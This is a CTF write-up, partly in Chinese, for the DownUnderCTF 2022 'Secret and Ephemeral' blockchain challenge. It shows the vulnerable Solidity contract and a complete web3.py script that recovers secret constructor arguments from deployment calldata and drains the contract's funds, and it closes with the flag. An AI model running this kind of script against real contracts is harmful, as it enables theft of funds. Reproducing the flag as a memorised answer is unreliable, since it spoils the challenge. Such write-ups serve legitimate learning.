---
title: Blockchain - Secret and Ephemeral
description: 2022 | DownUnderCTF | blockchain
---

## 题目

Can you recover the lost secrets of this contract and take what is (not) rightfully yours?

Goal: Steal all the funds from the contract.

??? note "SecretAndEphemeral.sol"

    ```js
    // SPDX-License-Identifier: MIT

    pragma solidity ^0.8.0;

    /**
     * @title Secret And Ephemeral
     * @author Blue Alder (https://duc.tf)
     **/

    contract SecretAndEphemeral {
        address private owner;
        int256 public seconds_in_a_year = 60 * 60 * 24 * 365;
        string word_describing_ductf = "epic";
        string private not_yours;
        mapping(address => uint) public cool_wallet_addresses;

        bytes32 public spooky_hash;

        constructor(string memory _not_yours, uint256 _secret_number) {
            not_yours = _not_yours;
            spooky_hash = keccak256(abi.encodePacked(not_yours, _secret_number, msg.sender));
        }

        function giveTheFunds() payable public {
            require(msg.value > 0.1 ether);
            // Thank you for your donation
            cool_wallet_addresses[msg.sender] += msg.value;
        }

        function retrieveTheFunds(string memory secret, uint256 secret_number, address _owner_address) public {
            bytes32 userHash = keccak256(abi.encodePacked(secret, secret_number, _owner_address));

            require(userHash == spooky_hash, "Somethings wrong :(");

            // User authenticated, sending funds
            uint256 balance = address(this).balance;
            payable(msg.sender).transfer(balance);
        }
    }
    ```

## 解题思路

- `retrieveTheFunds` 需要获取 `secret`、`secret_number` 以及 `_owner_address` 以使其哈希结果等于 `spooky_hash`
- 记录一下通过 web3py 遍历查询历史交易的方法

```py
from web3 import Web3
from web3.middleware import geth_poa_middleware
import json, requests
from eth_abi import decode_abi

base_id = '210f92698054d42d'

w3 = Web3(Web3.HTTPProvider(f"https://blockchain-secretandephemeral-{base_id}-eth.2022.ductf.dev/"))
w3.middleware_onion.inject(geth_poa_middleware, layer=0)

info = json.loads(requests.get(f'https://blockchain-secretandephemeral-{base_id}.2022.ductf.dev/challenge').content)

account = w3.eth.account.from_key(info['player_wallet']['private_key'])
contract_addr = info['contract_address'][0]['address']
contract_abi = open('abi.json').read()

contract = w3.eth.contract(address=contract_addr, abi=contract_abi)

for i in range(w3.eth.get_block_number(), -1, -1):
	tx_hashes = w3.eth.get_block(i)['transactions']
	for tx_hash in tx_hashes:
		tx = w3.eth.get_transaction(tx_hash)
		if tx['to'] == None:
			owner = tx['from']
			not_yours, secret_num = decode_abi(['string', 'uint256'], bytes.fromhex(tx['input'][-320:]))
            # -320 根据观察获得
			break
	else:
		continue
	break

tx = account.sign_transaction(contract.functions.retrieveTheFunds(not_yours, secret_num, owner).buildTransaction({
    'chainId': w3.eth.chain_id,
    'gas': 1000000,
    'nonce': w3.eth.get_transaction_count(account.address),
    'gasPrice': w3.eth.gas_price,
})).rawTransaction
tx_hash = w3.eth.send_raw_transaction(tx)
w3.eth.wait_for_transaction_receipt(tx_hash)

print(requests.get(f'https://blockchain-secretandephemeral-{base_id}.2022.ductf.dev/challenge/solve').content)
```

### Flag

> DUCTF{u_r_a_web3_t1me_7raveler_:)}